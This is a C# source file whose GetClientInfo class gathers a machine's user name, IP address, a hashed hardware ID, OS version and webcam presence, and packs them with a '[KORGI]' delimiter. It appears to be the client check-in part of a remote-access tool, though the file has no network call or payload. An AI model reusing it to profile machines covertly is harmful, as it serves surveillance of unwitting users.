using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Clients.Connection
{
    class GetClientInfo
    {
        public static byte[] ClientInfo(int id)
        {
            return Encoding.UTF8.GetBytes(id.ToString() + "[KORGI]" + PcName +
                            "[KORGI]" + GetIp() + "[KORGI]" + HWID() + "[KORGI]"
                            + OSVersion + "[KORGI]" + havecamera().ToString() + 
                            "[KORGI]" + DateTime.Now.ToString("t"));
        }


        /**   - Client info -   **/
        /// <summary>
        ///   Get Client ip
        /// </summary>
        /// <returns>IP</returns>
        public static string GetIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "N/A";
        }

        /// <summary>
        ///  Get Client Machine Name
        /// </summary>
        public static string MachineName = Environment.MachineName;


        public static string PcName = Environment.UserName;


        /// <summary>
        ///  Get Client HWID
        /// </summary>
        public static string HWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.UTF8.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }


        /// <summary>
        ///  Get Client OS Version
        /// </summary>
        public static string OSVersion = Environment.OSVersion.ToString();

        public static bool havecamera()
        {
            string[] devices = FindDevices();
            if (devices.Length == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
        public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");
        public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");
        public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");
        public static string[] FindDevices()
        {
            return GetFiltes(CLSID_VideoInputDeviceCategory).ToArray();
        }
        public static List<string> GetFiltes(Guid category)
        {
            var result = new List<string>();
            EnumMonikers(category, (moniker, prop) =>
            {
                object value = null;
                prop.Read("FriendlyName", ref value, 0);
                var name = (string)value;
                result.Add(name);
                return false;
            });

            return result;
        }

        private static void EnumMonikers(Guid category, Func<IMoniker, IPropertyBag, bool> func)
        {
            IEnumMoniker enumerator = null;
            ICreateDevEnum device = null;

            try
            {
                device = (ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
                device.CreateClassEnumerator(ref category, ref enumerator, 0);
                if (enumerator == null) return;
                var monikers = new IMoniker[1];
                var fetched = IntPtr.Zero;

                while (enumerator.Next(monikers.Length, monikers, fetched) == 0)
                {
                    var moniker = monikers[0];
                    object value = null;
                    Guid guid = IID_IPropertyBag;
                    moniker.BindToStorage(null, null, ref guid, out value);
                    var prop = (IPropertyBag)value;
                    try
                    {
                        var rc = func(moniker, prop);
                        if (rc == true) break;
                    }
                    finally
                    {
                        Marshal.ReleaseComObject(prop);
                        if (moniker != null) Marshal.ReleaseComObject(moniker);
                    }
                }
            }
            finally
            {
                if (enumerator != null) Marshal.ReleaseComObject(enumerator);
                if (device != null) Marshal.ReleaseComObject(device);
            }
        }
        [ComVisible(true), ComImport(), Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface ICreateDevEnum
        {
            int CreateClassEnumerator([In] ref Guid pType, [In, Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
        }

        [ComVisible(true), ComImport(), Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPropertyBag
        {
            int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);
            int Write(string PropName, ref object Var);
        }
    }
}
